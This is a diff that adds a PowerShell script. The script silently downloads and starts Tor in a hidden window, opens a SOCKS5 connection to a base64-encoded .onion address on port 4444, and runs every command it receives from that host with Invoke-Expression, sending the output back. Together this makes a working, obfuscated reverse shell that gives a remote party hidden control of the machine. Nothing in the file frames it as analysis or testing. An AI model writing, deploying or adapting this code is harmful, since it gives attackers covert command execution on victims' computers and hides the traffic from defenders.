@@ -1,0 +1,102 @@
+function a1 {
+    $u2 = ([Text.Encoding]::ASCII).GetString([Convert]::FromBase64String('aHR0cHM6Ly9hcmNoaXZlLnRvcnByb2plY3Qub3JnL3Rvci1wYWNrYWdlLWFyY2hpdmUvdG9yYnJvd3Nlci8xNC41LjQvdG9yLWV4cGVydC1idW5kbGUtd2luZG93cy14ODYtNjQtMTQuNS40LnRhci5neiA='))
+    $d3 = "$env:TEMP\tor.tar.gz"
+    $e4 = "$env:TEMP\tor"
+    $f5 = "$e4\tor.exe"
+    $g6 = "$e4\torrc"
+    $h7 = "$e4\Data"
+
+    if (-not (Test-Path $f5)) {
+        Write-Host "[*] Dwnld Tor..."
+        Invoke-WebRequest -Uri $u2 -OutFile $d3 | Out-Null
+        Write-Host "[*] Extracting..."
+        tar -xvf $d3 -C $env:TEMP | Out-Null
+    }
+
+    if (-not (Test-Path $h7)) { New-Item -ItemType Directory -Path $h7 | Out-Null }
+
+    $config = @"
+SocksPort 9050
+DataDirectory $h7
+Log notice stdout
+"@
+    $config | Set-Content -Path $g6 -Encoding ASCII
+
+    Write-Host "[*] Starting Tor..."
+    Start-Process -FilePath $f5 -ArgumentList "-f `"$g6`"" -WindowStyle Hidden | Out-Null
+
+    Start-Sleep -Seconds 25
+}
+
+function b2 {
+    param (
+        [string]$pH = "127.0.0.1",
+        [int]$pP = 9050,
+        [string]$dH,
+        [int]$dP
+    )
+
+    $c = New-Object Net.Sockets.TcpClient
+    $c.Connect($pH, $pP)
+    $s = $c.GetStream()
+
+    $s.Write(@(0x05,0x01,0x00),0,3)
+
+    $r = New-Object byte[] 2
+    $s.Read($r,0,2) | Out-Null
+    if ($r[1] -ne 0x00) { throw "Proxy needs auth, not supported." }
+
+    $hb = [Text.Encoding]::ASCII.GetBytes($dH)
+    $req = New-Object byte[] (7 + $hb.Length)
+    $req[0] = 0x05
+    $req[1] = 0x01
+    $req[2] = 0x00
+    $req[3] = 0x03
+    $req[4] = $hb.Length
+    $hb.CopyTo($req,5)
+    $req[-2] = [byte]($dP -shr 8)
+    $req[-1] = [byte]($dP -band 0xFF)
+
+    $s.Write($req,0,$req.Length)
+
+    $r2 = New-Object byte[] 10
+    $s.Read($r2,0,10) | Out-Null
+    if ($r2[1] -ne 0x00) { throw "Connect request failed with code $($r2[1])" }
+
+    return $c
+}
+
+a1
+
+$o = ([Text.Encoding]::ASCII).GetString([Convert]::FromBase64String('aWt1NHVnNTY0cGp2bXN0em41NnN3enR1M3QzdWMydzZ1NWF3aWpxdGN1cWE0M2VtdTRpNHpjYWQub25pb24='))
+$p = 4444
+$ph = "127.0.0.1"
+$pp = 9050
+
+try {
+    $cl = b2 -pH $ph -pP $pp -dH $o -dP $p
+} catch {
+    Write-Host "Error connecting to Tor Proxy: $_"
+    exit
+}
+
+$st = $cl.GetStream()
+$rd = New-Object IO.StreamReader($st)
+$wr = New-Object IO.StreamWriter($st)
+$wr.AutoFlush = $true
+
+while ($true) {
+    $cmd = $rd.ReadLine()
+    if ($cmd -eq $null -or $cmd -eq "exit") { break }
+
+    try {
+        $out = Invoke-Expression $cmd 2>&1 | Out-String
+    } catch {
+        $out = "Error: " + $_.Exception.Message
+    }
+
+    $out += "`n__END__"
+    $wr.WriteLine($out)
+}
+
+$cl.Close()
